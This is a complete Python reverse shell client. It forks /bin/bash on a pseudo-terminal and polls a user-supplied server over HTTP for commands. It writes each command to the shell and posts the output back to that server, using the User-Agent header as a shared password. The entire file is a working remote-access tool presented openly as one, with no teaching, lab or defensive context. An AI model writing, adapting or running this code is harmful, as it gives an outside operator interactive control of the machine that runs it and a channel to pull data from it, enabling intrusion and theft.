import argparse
import os
import pty
import select
import requests
import time

def parse_args():
    parser = argparse.ArgumentParser(description="Reverse shell client.")
    parser.add_argument("--server", required=True, help="Server URL")
    parser.add_argument("--user-agent")
    return parser.parse_args()

if __name__ == "__main__":
    args = parse_args()

    SERVER_URL = args.server
    PASSWORD = args.user_agent
    HEADERS = {
        "User-Agent": PASSWORD,
        "Content-Type": "application/octet-stream"
    }

    master, slave = pty.openpty()
    shell = "/bin/bash"
    pid = os.fork()

    if pid == 0:
        # Child process
        os.setsid()
        os.dup2(slave, 0)  # stdin
        os.dup2(slave, 1)  # stdout
        os.dup2(slave, 2)  # stderr
        os.close(master)
        os.close(slave)
        os.execv(shell, [shell])
    else:
        # Parent process
        os.close(slave)
        authenticated = False
        while True:
            try:
                response = requests.get(SERVER_URL, headers=HEADERS)
                if response.status_code != 200:
                    print("[-] Server error")
                    break

                command = response.content

                if not authenticated:
                    if command.decode() == PASSWORD:
                        authenticated = True
                        print("[+] Authenticated")
                        requests.post(SERVER_URL, data=b"Authenticated", headers=HEADERS)
                    else:
                        print("[-] Authentication failed")
                        requests.post(SERVER_URL, data=b"Auth Failed", headers=HEADERS)
                        break
                    continue

                if b"terminate" in command:
                    break

                if command:
                    os.write(master, command + b'\n')
                    output = b''
                    while True:
                        rlist, _, _ = select.select([master], [], [], 0.5)
                        if master in rlist:
                            chunk = os.read(master, 1024)
                            if not chunk:
                                break
                            output += chunk
                        else:
                            break

                    if output:
                        requests.post(SERVER_URL, data=output, headers=HEADERS)

            except Exception as e:
                print(f"[!] Error: {e}")
                time.sleep(3)
